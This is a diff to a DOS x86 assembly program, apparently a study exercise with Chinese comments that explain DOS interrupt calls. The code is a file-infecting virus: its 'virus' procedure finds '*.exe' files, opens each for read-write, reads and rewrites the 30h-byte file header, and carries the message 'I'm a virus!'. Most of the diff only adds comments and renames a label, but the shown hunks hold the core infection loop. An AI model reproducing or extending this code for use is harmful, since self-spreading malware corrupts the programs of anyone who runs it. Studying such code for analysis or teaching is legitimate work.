@@ -3,7 +3,6 @@ data segment
 
 data ends
 code segment
-             assume cs:code
     start:   
              mov    ax,cs ;初始化
              mov    ds,ax
@@ -56,17 +55,20 @@ virus proc
              add    dx,1eh                      ;文件名地址
             ;DS:DX=带路径的文件名
              mov    ax,3d02h                    ;3d打开文件,02方式：读写
-             int    21h
+             int    21h                         ;CF=0成功,AX=文件号,CF=1失败,AX=错误码
 
              mov    bx,ax                       ;文件号
     
              mov    ax,4200h                    ;移动文件指针到文件头
+                                                ;BX=文件号,CX:DX=移动的位移量
              xor    cx,cx
              xor    dx,dx
              int    21h
 
-             mov    ah,3fh                      ;读文件头,内容存到head
+             mov    ah,3fh                      ;3F号功能,读文件头,内容存到head
+                                                ;BX=文件号，CX=字节数
              mov    cx,30h                      ;读取30字节
+
              lea    dx,[bp+offset head]         
              mov    si,dx                       ;si=offset head
              int    21h
@@ -122,11 +124,12 @@ virus proc
              mov    cx,30h
              int    21h
 
-    nextfile:
-             mov    ah,3eh                      ;关闭文件
+    next_file:
+             mov    ah,3eh                      ;关闭文件,参数：BX=文件号
              int    21h
 
              mov    ah,4fh                      ;查找下一个文件
+                                                ;返回CF=1失败,AX=错误码
              int    21h
              jc     Exit
              jmp    modify
@@ -134,12 +137,10 @@ virus proc
     Exit:   
              ret
 virus endp
-
-    filename db     "*.exe",0
-    dta      db     02bh dup(0)
+    filename db     "*.exe",0                   ;文件名
+    dta      db     02bh dup(0)                 ;磁盘缓冲区
     string   db     "I'm a virus!",13,10,'$'
-    head     db     30h dup(0)
-
+    head     db     30h dup(0)                  ;读文件头,内容存到head
     theend:  
 code ends
 end start
